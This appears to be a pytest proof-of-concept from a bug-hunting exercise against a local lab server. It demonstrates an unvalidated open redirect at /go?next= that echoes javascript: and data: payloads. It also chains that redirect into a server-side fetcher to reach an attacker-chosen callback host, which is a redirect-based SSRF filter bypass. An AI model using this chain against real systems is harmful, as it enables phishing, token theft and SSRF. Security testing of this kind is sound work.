"""PoC: Open redirect at /go?next= composed with the routing/SSRF seam.

Target defects on 127.0.0.1:62395 (apex Range host):
  * GET /go?next=<ANY>  -> 302 Location: <ANY>, verbatim, NO validation and NO auth.
      Accepts absolute URLs, protocol-relative //host, and even javascript:/data: schemes.
      The redirector lives on the SAME origin that serves the auth endpoints
      (/login sets range_session, /api/v1/session hands out accessToken/sessionToken),
      so it is a trusted-origin open redirect -> phishing + token-theft delivery primitive.
  * COMPOSITION: the server-side fetcher GET /api/v1/fetch?url= FOLLOWS that 302, so an
      attacker who hands the fetcher a trusted-looking first URL
      (http://127.0.0.1:62395/go?next=//attacker/) launders it into a fetch of an
      arbitrary host. Open redirect defeats any origin/allowlist trust placed in the
      first hop (redirect-based SSRF filter bypass).

Counterpart proof that this is a real app defect (not a framework default): the sibling
  GET /logout?next= on the SAME server SANITIZES next (only ever redirects to "/"), so the
  server knows how to validate; /go simply does not.

Run: python3 -I -m pytest -q test_open_redirect_seam.py -s
"""
import os
import sys
import urllib.parse as up
import urllib.request as ur

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from p1hunt_dyn import Client  # noqa: E402

BASE = "http://127.0.0.1:62395"
OOB = os.environ["P1HUNT_OOB_URL"].rstrip("/")  # http://127.0.0.1:62490, in scope (127.0.0.1)
OOB_HOST = up.urlsplit(OOB).netloc  # 127.0.0.1:62490


class _NoRedir(ur.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


def _location(path):
    """Return the raw Location header the target emits, without following it."""
    op = ur.build_opener(_NoRedir())
    req = ur.Request(BASE + path)
    try:
        r = op.open(req, timeout=5)
        return r.status, None
    except ur.HTTPError as e:
        return e.code, e.headers.get("Location")


def test_go_open_redirect_arbitrary_host_unauth():
    """Unauthenticated /go?next= reflects attacker host into Location verbatim."""
    for raw_next in ["//" + OOB_HOST + "/x", "http://" + OOB_HOST + "/x"]:
        code, loc = _location("/go?next=" + up.quote(raw_next, safe=""))
        assert code == 302, (raw_next, code)
        assert loc == raw_next, f"expected open-redirect Location {raw_next!r}, got {loc!r}"
        print(f"[open-redirect] /go?next={raw_next} -> 302 Location: {loc}")


def test_go_accepts_dangerous_schemes():
    """/go does not even restrict scheme: javascript:/data: are echoed into Location."""
    for raw_next in ["javascript:alert(1)", "data:text/html,xss"]:
        code, loc = _location("/go?next=" + up.quote(raw_next, safe=""))
        assert code == 302 and loc == raw_next, (raw_next, code, loc)
        print(f"[open-redirect] /go accepts scheme: Location: {loc}")


def test_logout_is_the_safe_counterpart():
    """Sibling /logout?next= on the same server SANITIZES -> proves /go's miss is a real bug."""
    code, loc = _location("/logout?next=" + up.quote("//" + OOB_HOST + "/x", safe=""))
    assert code == 302 and loc == "/", (code, loc)
    print(f"[counterpart] /logout?next=//{OOB_HOST}/x -> 302 Location: {loc}  (sanitized)")


def test_fetcher_follows_open_redirect_to_arbitrary_host():
    """COMPOSITION: hand the server fetcher a trusted-origin URL that bounces off /go to
    an attacker host; the callback fires -> open-redirect-laundered SSRF."""
    c = Client()
    oob_url, token = c.oob_url("redir_ssrf")
    bounce = BASE + "/go?next=" + up.quote("//" + OOB_HOST + "/" + token, safe="")
    r = c.get("/api/v1/fetch", params={"url": bounce})
    assert r.status == 200, r.status
    assert c.oob_received(token), "fetcher did not follow /go redirect to attacker host"
    print(f"[composition] fetch({bounce}) -> callback {token} received: "
          f"server followed open redirect to attacker-chosen {OOB_HOST}")
